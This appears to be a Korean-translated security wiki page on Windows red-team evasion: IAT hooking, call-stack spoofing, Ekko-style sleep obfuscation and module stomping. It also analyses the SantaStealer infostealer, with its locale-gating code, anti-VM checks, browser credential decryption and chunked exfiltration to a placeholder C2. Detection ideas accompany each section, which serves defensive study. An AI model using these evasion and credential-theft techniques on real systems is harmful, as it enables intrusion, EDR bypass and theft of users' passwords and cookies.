Red teams는 C2 implant 밖으로 runtime evasion을 옮겨 대상 module 자체에 넣을 수 있다. 이를 위해 Import Address Table (IAT)을 hooking하고, 선택한 API를 공격자 제어의 position‑independent code (PIC)로 라우팅한다. 이 방식은 많은 kit가 노출하는 작은 API surface(예: CreateProcessA)보다 evasion을 더 일반화하며, 같은 보호를 BOFs와 post‑exploitation DLL에도 확장한다.

High-level approach
- Reflective loader를 사용해 target module 옆에 PIC blob을 stage한다(prepended 또는 companion). PIC는 self-contained이고 position‑independent여야 한다.
- host DLL이 로드되면 IMAGE_IMPORT_DESCRIPTOR를 순회하고, target import(예: CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc)의 IAT entry를 얇은 PIC wrapper로 patch한다.
- 각 PIC wrapper는 real API address로 tail-calling하기 전에 evasion을 실행한다. 일반적인 evasion에는 다음이 포함된다:
- call 전 Memory mask/unmask(예: beacon region을 encrypt, RWX→RX, page name/permission 변경) 후 call 후 복구.
- Call-stack spoofing: benign stack을 구성하고 target API로 transition하여 call-stack analysis가 expected frame을 resolve하도록 한다.
- 호환성을 위해 interface를 export하여 Aggressor script(또는 동등한 것)가 Beacon, BOFs, post-ex DLL에서 어떤 API를 hook할지 등록할 수 있게 한다.

Why IAT hooking here
- tool code를 수정하거나 Beacon이 특정 API를 proxy하는 데 의존하지 않고, hooked import를 사용하는 모든 code에 대해 동작한다.
- post-ex DLL을 커버한다: LoadLibrary*를 hooking하면 module load(System.Management.Automation.dll, clr.dll 등)를 intercept하고, 그 API call에도 같은 masking/stack evasion을 적용할 수 있다.
- CreateProcessA/W를 wrapping하여 call-stack 기반 detection에 대한 process-spawning post-ex command의 안정적인 사용을 복구한다.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- relocations/ASLR 이후, 그리고 import를 처음 사용하기 전에 patch를 적용하세요. TitanLdr/AceLdr 같은 reflective loaders는 로드된 module의 DllMain 동안 hooking을 수행하는 것을 보여줍니다.
- wrappers는 아주 작고 PIC-safe하게 유지하세요; patching 전에 캡처한 original IAT value 또는 LdrGetProcedureAddress를 통해 true API를 resolve하세요.
- PIC에는 RW → RX 전환을 사용하고 writable+executable pages를 남기지 마세요.

Call‑stack spoofing stub
- Draugr‑style PIC stubs는 fake call chain(return addresses into benign modules)을 만들고 나서 real API로 pivot합니다.
- 이는 Beacon/BOFs에서 sensitive APIs로 가는 canonical stacks를 기대하는 detections를 우회합니다.
- stack cutting / stack stitching techniques와 함께 사용해 API prologue 전에 expected frames 안으로 landing하세요.

Operational integration
- reflective loader를 post‑ex DLLs 앞에 prepend해서 DLL이 로드될 때 PIC와 hooks가 자동으로 initialise되게 하세요.
- Aggressor script를 사용해 target APIs를 register하면 code changes 없이 Beacon과 BOFs가 동일한 evasion path의 이점을 투명하게 받습니다.

Detection/DFIR considerations
- IAT integrity: non-image(heap/anon) addresses로 resolve되는 entries; import pointers의 주기적 verification.
- Stack anomalies: loaded images에 속하지 않는 return addresses; non-image PIC로의 abrupt transitions; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: IAT에 대한 in-process writes, import thunks를 modify하는 early DllMain activity, load 시 생성되는 unexpected RX regions.
- Image-load evasion: hooking LoadLibrary*를 하는 경우, memory masking events와 연관된 automation/clr assemblies의 suspicious loads를 monitor하세요.

Related building blocks and examples
- load 중 IAT patching을 수행하는 reflective loaders (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (e.g., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

reflective loader를 control할 수 있다면, loader의 `GetProcAddress` pointer를 hooks를 먼저 확인하는 custom resolver로 바꿔 `ProcessImports()` 동안 **during** imports를 hook할 수 있습니다:

- transient loader PIC가 자신을 해제한 뒤에도 살아남는 **resident PICO**(persistent PIC object)를 만드세요.
- loader의 import resolver를 덮어쓰는 `setup_hooks()` function을 export하세요. (e.g., `funcs.GetProcAddress = _GetProcAddress`).
- `_GetProcAddress`에서 ordinal imports는 건너뛰고 `__resolve_hook(ror13hash(name))` 같은 hash-based hook lookup을 사용하세요. hook이 있으면 그것을 반환하고, 없으면 real `GetProcAddress`에 위임하세요.
- Crystal Palace `addhook "MODULE$Func" "hook"` entries로 link time에 hook target을 register하세요. hook은 resident PICO 안에 존재하므로 valid하게 유지됩니다.

이것은 load 후 loaded DLL의 code section을 patch하지 않고도 **import-time IAT redirection**을 제공합니다.

### target이 PEB-walking을 사용할 때 hookable imports를 강제로 만들기

import-time hooks는 function이 target의 IAT에 실제로 있을 때만 trigger됩니다. module이 PEB-walk + hash(no import entry)로 APIs를 resolve한다면, loader의 `ProcessImports()` path가 이를 볼 수 있도록 real import를 강제로 만드세요:

- hashed export resolution (e.g., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`)을 `&WaitForSingleObject` 같은 direct reference로 바꾸세요.
- compiler가 IAT entry를 emit하므로, reflective loader가 imports를 resolve할 때 interception이 가능해집니다.

### `Sleep()`을 patch하지 않고 Ekko-style sleep/idle obfuscation 하기

`Sleep`을 patch하는 대신, implant가 사용하는 **actual wait/IPC primitives** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`)를 hook하세요. 긴 wait의 경우, idle 동안 in-memory image를 encrypt하는 Ekko-style obfuscation chain으로 call을 감싸세요:

- `CreateTimerQueueTimer`를 사용해 `NtContinue`를 crafted `CONTEXT` frames와 함께 호출하는 callbacks sequence를 스케줄하세요.
- Typical chain (x64): image를 `PAGE_READWRITE`로 설정 → `advapi32!SystemFunction032`로 full mapped image를 RC4 encrypt → blocking wait 수행 → RC4 decrypt → PE sections를 walking해서 **restore per-section permissions** → completion signal.
- `RtlCaptureContext`는 template `CONTEXT`를 제공합니다; 이를 여러 frames에 clone하고 registers (`Rip/Rcx/Rdx/R8/R9`)를 설정해 각 step을 호출하세요.

Operational detail: 긴 wait에서는 “success”(e.g., `WAIT_OBJECT_0`)를 반환해 caller가 image가 masked된 동안 계속 진행하도록 하세요. 이 pattern은 idle windows 동안 scanner로부터 module을 숨기고, classic “patched `Sleep()`” signature를 피합니다.

Detection ideas (telemetry-based)
- `NtContinue`를 가리키는 `CreateTimerQueueTimer` callbacks의 bursts.
- 큰 contiguous image-sized buffers에 사용된 `advapi32!SystemFunction032`.
- large-range `VirtualProtect` 다음 custom per-section permission restoration.


## Precision Module Stomping

Module stomping은 눈에 띄는 private executable memory를 할당하거나 새 sacrificial DLL을 로드하는 대신, target process 안에 이미 mapped된 **DLL의 `.text` section**에서 payload를 실행합니다. overwrite target은 process가 아직 필요로 하는 code paths를 망가뜨리지 않으면서 payload를 흡수할 수 있는 **loaded, disk-backed image**여야 합니다.

### Reliable target selection

`uxtheme.dll`이나 `comctl32.dll` 같은 common modules를 상대로 한 naive stomping은 불안정합니다: DLL이 remote process에 로드되어 있지 않을 수 있고, code region이 너무 작으면 process가 crash합니다. 더 reliable한 workflow는 다음과 같습니다.

1. target process modules를 열거하고, 이미 loaded된 DLL들의 **names-only include list**를 유지합니다.
2. payload를 먼저 만들고 **exact byte size**를 기록합니다.
3. disk의 candidate DLL을 scan하고 PE section **`.text` `Misc_VirtualSize`**를 payload size와 비교합니다. 이는 file size보다 더 중요합니다. memory에 mapped될 때의 executable section 크기를 반영하기 때문입니다.
4. **Export Address Table (EAT)**을 parse하고, stomp start offset으로 사용할 exported function RVA를 고릅니다.
5. **blast radius**를 계산합니다: payload가 선택한 function boundary를 넘으면, memory에서 그 뒤에 배치된 인접 exports를 overwrite하게 됩니다.

wild에서 보이는 typical recon/selection helpers:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
운영 참고
- `LoadLibrary`/예기치 않은 image 로드의 telemetry를 피하기 위해 원격 프로세스에 **이미 로드된** DLL을 우선 사용한다.
- 대상 애플리케이션이 거의 실행하지 않는 exports를 우선 사용한다. 그렇지 않으면 정상 코드 경로가 thread creation 전후로 stomp된 bytes에 닿을 수 있다.
- 큰 implant는 종종 shellcode embedding을 문자열 리터럴에서 **byte-array/braced initializer**로 바꿔야 하며, 그래야 injector source에서 전체 buffer가 올바르게 표현된다.

Detection ideas
- 일반적인 private RWX/RX 할당보다, **image-backed executable pages**(`MEM_IMAGE`, `PAGE_EXECUTE*`)에 대한 remote writes.
- 메모리 내 bytes가 디스크의 backing file과 더 이상 일치하지 않는 export entry points.
- 실제 DLL export 내부에서 execution이 시작되며, 그 첫 bytes가 최근 수정된 것으로 보이는 remote threads 또는 context pivots.
- DLL `.text` pages에 대한 의심스러운 `VirtualProtect(Ex)` / `WriteProcessMemory` 시퀀스와 그 뒤를 잇는 thread creation.

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer(aka BluelineStealer)는 현대 info-stealers가 AV bypass, anti-analysis, credential access를 하나의 workflow로 어떻게 결합하는지 보여준다.

### Keyboard layout gating & sandbox delay

- config flag (`anti_cis`)가 `GetKeyboardLayoutList`를 통해 설치된 keyboard layouts를 열거한다. Cyrillic layout이 발견되면 샘플은 빈 `CIS` marker를 남기고 stealers를 실행하기 전에 종료하여, 제외된 locale에서는 절대 detonat되지 않으면서도 hunting artifact는 남긴다.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### 계층화된 `check_antivm` 로직

- Variant A는 프로세스 목록을 순회하며 각 이름을 custom rolling checksum으로 해시하고, 디버거/샌드박스용 내장 blocklists와 비교한다. 또한 컴퓨터 이름에도 checksum을 반복 적용하고 `C:\analysis` 같은 working directories를 확인한다.
- Variant B는 system properties(process-count floor, recent uptime)를 검사하고, VirtualBox additions를 감지하기 위해 `OpenServiceA("VBoxGuest")`를 호출하며, single-stepping을 찾기 위해 sleeps 전후의 timing checks를 수행한다. 어떤 항목이든 걸리면 modules가 실행되기 전에 중단된다.

### Fileless helper + double ChaCha20 reflective loading

- primary DLL/EXE는 Chromium credential helper를 내장하며, 이를 disk에 drop하거나 메모리에서 manual mapping으로 로드한다. fileless mode에서는 imports/relocations를 자체적으로 해결하므로 helper artifacts가 기록되지 않는다.
- 그 helper는 ChaCha20로 두 번 암호화된 second-stage DLL을 저장한다(32바이트 키 2개 + 12바이트 nonce 2개). 두 번의 pass 후, blob을 reflectively load하며(`LoadLibrary` 없음) [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)에서 파생된 `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` exports를 호출한다.
- ChromElevator routines는 direct-syscall reflective process hollowing을 사용해 live Chromium browser에 주입하고, AppBound Encryption keys를 상속받아, ABE hardening에도 불구하고 SQLite databases에서 passwords/cookies/credit cards를 직접 복호화한다.


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log`는 global `memory_generators` function-pointer table을 순회하며, 활성화된 각 module(Telegram, Discord, Steam, screenshots, documents, browser extensions, 등)마다 thread 하나를 생성한다. 각 thread는 결과를 shared buffers에 쓰고, 약 45초의 join window 후 파일 개수를 보고한다.
- 완료되면 모든 것을 statically linked `miniz` library로 `%TEMP%\\Log.zip`에 zip한다. 그런 다음 `ThreadPayload1`이 15초 sleep 후 `http://<C2>:6767/upload`로 HTTP POST를 통해 archive를 10 MB chunks로 전송하며, 브라우저의 `multipart/form-data` boundary(`----WebKitFormBoundary***`)를 spoofing한다. 각 chunk에는 `User-Agent: upload`, `auth: <build_id>`, 선택적으로 `w: <campaign_tag>`가 추가되며, 마지막 chunk에는 `complete: true`가 붙어 C2가 reassembly 완료를 알 수 있게 한다.

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
